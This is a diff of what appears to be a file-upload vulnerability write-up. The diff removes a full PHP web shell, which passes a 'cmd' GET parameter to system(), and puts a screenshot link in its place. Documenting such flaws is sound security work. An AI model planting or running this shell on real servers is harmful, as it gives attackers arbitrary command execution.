@@ -54,23 +54,8 @@ The admin interface allows uploading of files without proper validation or filte
 - Accessed the shell via its URL path, enabling arbitrary command execution.
 
 **PHP Shell**:
- **`<html>
-<body>
-<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
-<input type="TEXT" name="cmd" id="cmd" size="80">
-<input type="SUBMIT" value="Execute">
-</form>
-<pre>
-<?php
-    if(isset($_GET['cmd']))
-    {
-        system($_GET['cmd']);
-    }
-?>
-</pre>
-</body>
-<script>document.getElementById("cmd").focus();</script>
-</html>`**
+ ![image](https://github.com/user-attachments/assets/ce4403a7-781f-41dc-aa93-61df724f5a5c)
+
 
 ![Screenshot 2025-05-31 211505](https://github.com/user-attachments/assets/d0255c20-dce6-4148-a152-5595500cc4ac)
 
